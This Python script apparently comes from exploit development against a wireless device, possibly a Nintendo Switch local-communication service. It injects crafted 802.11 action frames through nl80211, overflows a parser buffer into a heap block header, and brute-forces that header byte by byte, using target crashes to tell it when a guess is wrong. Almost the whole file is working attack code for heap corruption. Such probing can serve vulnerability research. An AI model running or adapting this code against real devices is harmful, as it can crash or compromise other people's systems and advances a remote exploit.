#!/usr/bin/env python3
"""Probe the heap block header at parser+0x7AC byte-by-byte.

Crash boundary confirmed: body_size=0x751 (overflowing into the first byte
of the USED block header at parser+0x7AC) causes a crash with zero fill.

Strategy: for each header byte, try values 0x00-0xFF until we find one
that doesn't crash. This reconstructs the original header.

If the block is "MU" (used), magic = 0x4D55 LE = bytes [0x55, 0x4D].
"""

import os
import struct
import socket
import time
import subprocess
import json
from pathlib import Path

_LDN_ROOT = Path(__file__).resolve().parent.parent.parent
IFACE = "wlp5s0"
SWITCH_MAC = bytes.fromhex("ecc40df3dcdb")
SRC_MAC = bytes.fromhex("227ccee0bd56")
FREQ = 2412
LP2P_HEADER = b"\x7f\x00\x22\xaa\x04\x01\x01\x01\x00\x00\x00\x00"


def get_nl80211_family():
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 100
    s.bind((pid, 0))
    name = b'nl80211\x00'
    nla_b = struct.pack('HH', 4 + len(name), 2) + name
    if len(nla_b) % 4:
        nla_b += b'\x00' * (4 - len(nla_b) % 4)
    p = struct.pack('BBH', 3, 1, 0) + nla_b
    s.sendto(struct.pack('IHHII', 16 + len(p), 0x10, 3, 1, pid) + p, (0, 0))
    data = s.recv(8192)
    s.close()
    off = 20
    nllen = struct.unpack_from('I', data, 0)[0]
    while off < nllen:
        nla_len, nla_type = struct.unpack_from('HH', data, off)
        if nla_type == 1:
            return struct.unpack_from('H', data, off + 4)[0]
        off += (nla_len + 3) & ~3
    raise RuntimeError("nl80211 family not found")


def nla(t, d):
    if isinstance(d, int):
        d = struct.pack('I', d)
    n = struct.pack('HH', 4 + len(d), t) + d
    if len(n) % 4:
        n += b'\x00' * (4 - len(n) % 4)
    return n


def send_frame(fam_id, ifindex, frame_bytes):
    s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 16)
    pid = os.getpid() + 500 + (hash(frame_bytes[:16]) & 0xFFFF)
    s.bind((pid, 0))
    s.settimeout(2.0)
    genlhdr = struct.pack('BBH', 59, 0, 0)
    nla_data = nla(3, ifindex) + nla(38, FREQ) + nla(51, frame_bytes)
    payload = genlhdr + nla_data
    nlhdr = struct.pack('IHHII', 16 + len(payload), fam_id, 1 | 4, 99999, pid)
    try:
        s.sendto(nlhdr + payload, (0, 0))
        resp = s.recv(16384)
        _, msg_type = struct.unpack_from('IH', resp, 0)
        if msg_type == 2:
            err = struct.unpack_from('i', resp, 16)[0]
            s.close()
            return err
        s.close()
        return 0
    except socket.timeout:
        s.close()
        return -110
    except Exception as e:
        s.close()
        return str(e)


def build_frame(body):
    frame = bytearray()
    frame += struct.pack('<H', 0x00D0)
    frame += b"\x00\x00"
    frame += SWITCH_MAC
    frame += SRC_MAC
    frame += SWITCH_MAC
    frame += struct.pack('<H', 0x0000)
    frame += LP2P_HEADER
    frame += body
    return bytes(frame)


def build_probe_body(body_size, header_bytes):
    """Build type 3 body that overwrites the used block header with specific bytes.

    The used block header is at body offset 0x750 (parser+0x7AC).
    header_bytes: the bytes to write at body[0x750:0x750+len(header_bytes)]
    """
    body = bytearray(body_size)
    body[0x21] = 0x03
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01
    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, 0x0100)  # safe payload
    # Write specific header bytes at the used block position
    for i, b in enumerate(header_bytes):
        if 0x750 + i < body_size:
            body[0x750 + i] = b
    return bytes(body)


def check_alive():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect(('192.168.0.1', 80))
        s.sendall(b'GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n')
        d = s.recv(512)
        s.close()
        return b'HTTP/' in d
    except Exception:
        return False


def wait_alive(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        if check_alive():
            return True
        time.sleep(2)
    return False


def test_header(fam_id, ifindex, header_bytes, body_size=None, frame_count=80):
    """Test if writing specific header bytes crashes the sysmodule."""
    if body_size is None:
        body_size = 0x750 + len(header_bytes)

    if not check_alive():
        if not wait_alive(30):
            return None

    body = build_probe_body(body_size, header_bytes)
    frame = build_frame(body)

    for i in range(frame_count):
        err = send_frame(fam_id, ifindex, frame)
        if err != 0:
            break
        time.sleep(0.002)

    time.sleep(3)
    alive1 = check_alive()
    time.sleep(5)
    alive2 = check_alive()
    ping2 = subprocess.run(['ping', '-c', '1', '-W', '2', '192.168.0.1'],
                            capture_output=True).returncode == 0

    return alive2 and ping2


def main():
    ifindex = socket.if_nametoindex(IFACE)
    fam_id = get_nl80211_family()
    print(f"Interface: {IFACE}, nl80211 family: {fam_id}")
    print()

    # Phase 1: Test magic field (bytes 0-1 of used block header)
    print("=" * 60)
    print("  PROBING USED BLOCK HEADER AT parser+0x7AC")
    print("=" * 60)

    # First, test if "MU" magic (0x55, 0x4D) prevents crash
    print("\n[1] Testing magic field (2 bytes at header+0x00)...")

    magic_tests = [
        ("MU (0x4D55 LE)", bytes([0x55, 0x4D])),
        ("FR (0x4652 LE)", bytes([0x52, 0x46])),
        ("zero",           bytes([0x00, 0x00])),
        ("0xFF",           bytes([0xFF, 0xFF])),
    ]

    for name, magic in magic_tests:
        result = test_header(fam_id, ifindex, magic)
        status = "OK" if result else "CRASH" if result is not None else "SKIP"
        print(f"  magic={name:20s} → {status}")
        if not result and result is not None:
            time.sleep(15)
            wait_alive(30)

    # Phase 2: Probe byte-by-byte to find the EXACT original values
    print("\n[2] Byte-by-byte probe of header...")

    known_header = bytearray(24)  # will be filled as we discover values

    # Byte 0: test likely values
    print("\n  Byte 0 (magic low):")
    for val in [0x55, 0x52, 0x00, 0xFF, 0x41, 0x01]:
        result = test_header(fam_id, ifindex, bytes([val]))
        status = "OK" if result else "CRASH"
        print(f"    0x{val:02x} → {status}")
        if result:
            known_header[0] = val
            print(f"    *** Found: byte 0 = 0x{val:02x} ***")
            break
        time.sleep(15)
        wait_alive(30)
    else:
        # Try brute force
        print("    Brute forcing...")
        for val in range(256):
            if val in [0x55, 0x52, 0x00, 0xFF, 0x41, 0x01]:
                continue
            result = test_header(fam_id, ifindex, bytes([val]))
            if result:
                known_header[0] = val
                print(f"    *** Found: byte 0 = 0x{val:02x} ***")
                break
            time.sleep(15)
            wait_alive(30)

    if known_header[0] == 0:
        print("  Could not determine byte 0, aborting")
        return

    # Byte 1: test with known byte 0
    print(f"\n  Byte 1 (magic high), with byte 0 = 0x{known_header[0]:02x}:")
    for val in [0x4D, 0x46, 0x00, 0xFF, 0x01]:
        hdr = bytes([known_header[0], val])
        result = test_header(fam_id, ifindex, hdr)
        status = "OK" if result else "CRASH"
        print(f"    0x{val:02x} → {status}")
        if result:
            known_header[1] = val
            print(f"    *** Found: byte 1 = 0x{val:02x} ***")
            break
        time.sleep(15)
        wait_alive(30)

    magic = struct.unpack_from("<H", known_header, 0)[0]
    print(f"\n  Magic: 0x{magic:04x} = '{chr(known_header[0])}{chr(known_header[1])}'")

    # Bytes 2-3: attribute field
    print(f"\n  Bytes 2-3 (attribute):")
    for attr_val in [0x0000, 0x0001, 0x0008, 0x0003, 0x0040]:
        hdr = bytearray(known_header[:2])
        hdr += struct.pack("<H", attr_val)
        result = test_header(fam_id, ifindex, bytes(hdr))
        status = "OK" if result else "CRASH"
        print(f"    attr=0x{attr_val:04x} → {status}")
        if result:
            struct.pack_into("<H", known_header, 2, attr_val)
            print(f"    *** Found: attr = 0x{attr_val:04x} ***")
            break
        time.sleep(15)
        wait_alive(30)

    # Bytes 4-7: blockSize
    print(f"\n  Bytes 4-7 (blockSize):")
    # Test common sizes for small heap objects
    for size_val in [0x20, 0x40, 0x48, 0x60, 0x80, 0x100, 0x200, 0x400, 0x5D8, 0x1000]:
        hdr = bytearray(known_header[:4])
        hdr += struct.pack("<I", size_val)
        result = test_header(fam_id, ifindex, bytes(hdr))
        status = "OK" if result else "CRASH"
        print(f"    size=0x{size_val:04x} → {status}")
        if result:
            struct.pack_into("<I", known_header, 4, size_val)
            print(f"    *** Found: size = 0x{size_val:04x} ***")
            break
        time.sleep(15)
        wait_alive(30)

    # Summary
    print(f"\n{'='*60}")
    print("  HEADER PROBE RESULTS")
    print(f"{'='*60}")
    print(f"  Magic:     0x{struct.unpack_from('<H', known_header, 0)[0]:04x}")
    print(f"  Attribute: 0x{struct.unpack_from('<H', known_header, 2)[0]:04x}")
    print(f"  BlockSize: 0x{struct.unpack_from('<I', known_header, 4)[0]:08x}")
    print(f"  Header:    {known_header[:8].hex()}")

    outfile = str(_LDN_ROOT / "evidence" / "action_frame_overflow" / "header_probe.json")
    with open(outfile, "w") as f:
        json.dump({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "header_offset": "parser+0x7AC",
            "known_header_hex": known_header.hex(),
            "magic": f"0x{struct.unpack_from('<H', known_header, 0)[0]:04x}",
            "attribute": f"0x{struct.unpack_from('<H', known_header, 2)[0]:04x}",
            "blockSize": f"0x{struct.unpack_from('<I', known_header, 4)[0]:08x}",
        }, f, indent=2)
    print(f"\n  Saved to {outfile}")


if __name__ == "__main__":
    main()
